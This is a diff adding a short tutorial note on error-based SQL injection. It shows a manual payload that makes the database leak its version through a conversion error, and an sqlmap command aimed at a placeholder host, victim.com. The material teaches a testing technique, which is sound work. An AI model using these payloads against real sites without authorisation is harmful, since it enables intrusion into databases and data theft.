@@ -1,0 +1,17 @@
+1️⃣ Error-Based SQL Injection
+
+Idea: Force the database to produce an error that leaks data.
+
+Manual Payload Example:
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+
+
+This forces an error, and the error message may contain DB version info.
+
+sqlmap Command:
+
+sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=E --banner
+
+
+👉 --technique=E tells sqlmap to use Error-based injection.
